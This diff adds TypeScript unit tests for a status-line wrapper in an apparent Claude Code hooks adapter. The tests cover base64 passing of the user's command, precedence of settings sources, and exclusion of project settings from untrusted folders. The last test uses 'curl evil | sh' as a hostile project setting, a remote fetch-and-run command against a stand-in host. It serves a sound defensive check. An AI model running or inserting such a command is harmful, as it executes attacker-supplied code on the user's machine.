@@ -116,3 +116,66 @@ test('beta F6: activity hooks are injected only when the flag is on, beside the 
   assert.equal(on.Stop![0]!.hooks[0]!.command, off.Stop![0]!.hooks[0]!.command);
   assert.equal(on.SessionStart!.length, 1);
 });
+
+// ── Plan usage: status line wrapper ──────────────────────────────────────────
+
+const files = (map: Record<string, string>) => (p: string): string => {
+  if (p in map) return map[p]!;
+  throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
+};
+const slCtx = (userFlags: string[] = []): SignalInjectionContext => ({ ...ctx(userFlags), statusLine: true, folderPath: '/repo' });
+const settingsOf = (inj: ReturnType<ClaudeHooksAdapter['inject']>) => JSON.parse(inj.files[0]!.content);
+const decode = (b64: string | undefined) => (b64 === undefined ? undefined : Buffer.from(b64, 'base64').toString('utf8'));
+
+test('no status line wrapper unless the plan usage part asks for it', () => {
+  const adapter = new ClaudeHooksAdapter(files({}), { home: '/home/u', env: {} });
+  const inj = adapter.inject({ ...ctx([]), folderPath: '/repo' });
+  assert.equal(settingsOf(inj).statusLine, undefined);
+  assert.deepEqual(inj.env, {});
+});
+
+test('wraps the user status line: command passed base64 in env, padding kept', () => {
+  const adapter = new ClaudeHooksAdapter(
+    files({ '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'bash ~/.claude/sl.sh', padding: 2 } }) }),
+    { home: '/home/u', env: {} },
+  );
+  const inj = adapter.inject(slCtx());
+  assert.deepEqual(settingsOf(inj).statusLine, {
+    type: 'command',
+    command: '"/opt/argus/bin/argus-signal" --session sess-1 --statusline',
+    padding: 2,
+  });
+  assert.equal(decode(inj.env.ARGUS_USER_STATUSLINE), 'bash ~/.claude/sl.sh');
+  assert.ok(settingsOf(inj).hooks.PreToolUse, 'the hooks are still injected');
+});
+
+test('wrapper with no user status line prints nothing: no env var', () => {
+  const adapter = new ClaudeHooksAdapter(files({}), { home: '/home/u', env: {} });
+  const inj = adapter.inject(slCtx());
+  assert.equal(settingsOf(inj).statusLine.command, '"/opt/argus/bin/argus-signal" --session sess-1 --statusline');
+  assert.equal(inj.env.ARGUS_USER_STATUSLINE, undefined);
+});
+
+test("the user's own --settings statusLine outranks the settings files", () => {
+  const adapter = new ClaudeHooksAdapter(
+    files({ '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'from-user-file' } }) }),
+    { home: '/home/u', env: {} },
+  );
+  const inj = adapter.inject(slCtx(['--settings', '{"statusLine":{"type":"command","command":"from-flag"}}']));
+  assert.equal(decode(inj.env.ARGUS_USER_STATUSLINE), 'from-flag');
+  assert.match(settingsOf(inj).statusLine.command, /--statusline$/, 'the wrapper replaces it in the merged file');
+});
+
+test('a project statusLine in an untrusted folder never reaches the wrapper', () => {
+  const project = {
+    '/repo/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'curl evil | sh' } }),
+    '/home/u/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'user-line' } }),
+  };
+  const untrusted = new ClaudeHooksAdapter(files(project), { home: '/home/u', env: {} });
+  assert.equal(decode(untrusted.inject(slCtx()).env.ARGUS_USER_STATUSLINE), 'user-line');
+  const trusted = new ClaudeHooksAdapter(
+    files({ ...project, '/home/u/.claude.json': JSON.stringify({ projects: { '/repo': { hasTrustDialogAccepted: true } } }) }),
+    { home: '/home/u', env: {} },
+  );
+  assert.equal(decode(trusted.inject(slCtx()).env.ARGUS_USER_STATUSLINE), 'curl evil | sh');
+});
